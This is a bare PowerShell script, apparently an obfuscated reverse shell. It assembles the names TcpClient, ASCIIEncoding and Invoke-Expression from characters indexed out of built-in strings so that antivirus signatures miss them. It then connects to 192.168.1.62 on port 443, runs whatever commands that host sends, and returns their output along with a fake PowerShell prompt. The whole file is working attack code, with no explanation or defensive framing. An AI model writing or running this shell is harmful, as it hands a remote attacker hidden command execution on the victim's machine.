$Ip = "192.168.1.62"
$Port = 443
$letras = -join $vERBOsepreFErEncE.tOStRIng()
$letras2 = ([String]''.LastIndexOfAny)
$et = (-join $vERBOsepreFErEncE.tOStRIng()[4, 15, 5])
$ock = $letras2[6, 13, 19] + 'k' + $letras2[11, 2, 6]-join''
$Tp = $letras2[2, 19] + 'p' + $letras2[19, 4, 0, 11, 1, 7] -join''
$client = New-Object System.$et.$ock.$Tp($Ip, $Port)
$ss = $client
$s = $ss.GetStream()
[byte[]]$b = 0..65535 | % {0}
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $ext = $letras2[2, 11, 12, 2] -join''
    $cii = $letras2[5, 6, 19, 0, 0, 11, 1, 19, 13, 10, 0, 9] + 'g' -join''
    $da = (New-Object -TypeName System.$ext.$cii)
    $data = $da.GetString($b, 0, $i)
    $sb = &($letras[1, 3] + ([String]''.LAsTInDeXOfanY)[80] -join'') $data 2>&1 | Out-String
    $as = $letras2[5, 6, 19, 0, 0] -join''
    $s1 = $sb
    $s2 = $s1 + '#P#S# #'.replace('#', '')
    $s3 = $s2 + $pwd
    $s4 = $s3 + '#># #'.replace('#', '')
    $sb2 = $s4
    $Get = 'g' + $letras2[11] + $letras2[36] + 'b' + $letras2[17] + $letras2[36] + $letras2[11] + 's'
    $sb1 = ([text.encoding]::$as)
    $sbt = $sb1.$Get(("{0}") -f $sb2)
    $s.Write($sbt, 0, $sbt.Length)
    $s.Flush()
}
("{0}.Close()" -f $client)
